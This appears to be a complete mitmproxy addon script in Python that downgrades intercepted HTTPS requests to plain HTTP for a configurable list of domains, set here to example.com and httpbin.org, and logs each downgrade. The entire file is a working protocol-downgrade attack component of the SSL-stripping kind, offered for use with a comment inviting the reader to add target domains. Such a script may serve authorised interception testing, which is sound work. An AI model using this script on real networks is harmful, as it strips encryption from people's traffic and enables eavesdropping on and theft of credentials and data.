from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    """Downgrade HTTPS to HTTP for target domains."""
    target_domains = ["example.com", "httpbin.org"]  # Add your test domains
    
    if any(domain in flow.request.pretty_host for domain in target_domains):
        if flow.request.scheme == "https":
            flow.request.scheme = "http"
            print(f"[+] Downgraded: {flow.request.url}")
